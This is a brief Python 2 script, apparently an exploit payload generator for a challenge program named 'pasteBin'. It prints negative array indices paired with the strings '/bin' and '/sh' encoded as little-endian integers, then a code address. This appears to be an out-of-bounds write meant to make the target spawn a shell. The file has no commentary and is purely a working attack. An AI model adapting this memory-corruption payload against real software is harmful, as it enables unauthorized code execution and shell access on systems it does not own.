#!/usr/bin/python

import sys

print 'pasteBin'

def convert(string):
	"""convert 4 byte string into a little endian representaion of it as a number"""
	return str(int('0x' + ''.join([hex(ord(x))[2:] for x in string[::-1]]),16))


print "-1073741802"
print convert("/bin")

print "-1073741801"
print convert("/sh")

print "-1073741811"
print "134513712"

for x in range(7):
	print x
	print x 
